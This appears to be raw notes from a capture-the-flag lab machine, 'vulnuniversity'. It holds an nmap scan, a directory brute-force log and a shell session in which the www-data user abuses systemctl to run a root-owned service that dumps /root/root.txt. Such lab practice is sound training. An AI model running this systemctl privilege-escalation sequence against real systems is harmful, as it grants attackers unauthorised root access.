```
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 02:55:8E:00:45:2F (Unknown)


http://10.10.196.195:3333

    (Use mode '-w' if you want to scan it anyway)
                                                                                   
---- Entering directory: http://10.10.196.195:3333/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                   
---- Entering directory: http://10.10.196.195:3333/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                   
---- Entering directory: http://10.10.196.195:3333/internal/ ----
==> DIRECTORY: http://10.10.196.195:3333/internal/css/                             
+ http://10.10.196.195:3333/internal/index.php (CODE:200|SIZE:525)                 
==> DIRECTORY: http://10.10.196.195:3333/internal/uploads/                         
                                                                                   
---- Entering directory: http://10.10.196.195:3333/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                   
---- Entering directory: http://10.10.196.195:3333/internal/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                   
---- Entering directory: http://10.10.196.195:3333/internal/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)


WantedBy=multi-user.target' > $TF
www-data@vulnuniversity:/tmp$ 
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
www-data@vulnuniversity:/tmp$ TF=$(mktemp).service
www-data@vulnuniversity:/tmp$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
> [Install]
> 
WantedBy=multi-user.target' > $TF
www-data@vulnuniversity:/tmp$ /usr/systemctl link $TF
/usr/systemctl link $TF
bash: /usr/systemctl: No such file or directory
www-data@vulnuniversity:/tmp$ /bin/systemctl link $TF
/bin/systemctl link $TF
Created symlink from /etc/systemd/system/tmp.N6Kh8HR4Tu.service to /tmp/tmp.N6Kh8HR4Tu.service.
www-data@vulnuniversity:/tmp$ /bin/systemctl enable --now $TF
/bin/systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.N6Kh8HR4Tu.service to /tmp/tmp.N6Kh8HR4Tu.service.
www-data@vulnuniversity:/tmp$ ls
ls
exploit.sh
output
systemd-private-8b2af7c01c2244e1952743f721c3b68b-systemd-timesyncd.service-O7FxPo
tmp.C8hSkKvv5U
tmp.C8hSkKvv5U.service
tmp.N6Kh8HR4Tu
tmp.N6Kh8HR4Tu.service
tmp.ZgAoUX6t5l
tmp.jki5UiLBq5
tmp.jki5UiLBq5.service
www-data@vulnuniversity:/tmp$ cat output
cat output
a58ff8579f0a9270368d33a9966c7fd5
www-data@vulnuniversity:/tmp$ 


```
